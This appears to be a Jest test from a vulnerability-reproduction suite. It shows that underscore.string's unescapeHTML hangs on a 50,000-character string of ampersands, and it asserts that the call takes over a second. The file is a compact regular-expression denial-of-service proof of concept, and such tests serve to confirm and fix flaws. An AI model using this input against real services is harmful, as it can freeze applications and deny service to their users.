test("ReDos in underscore.string", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const us = require("underscore.string");
  let t = measureTime(function () {
    var agent = us.unescapeHTML(genstr(50000, "&"));
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
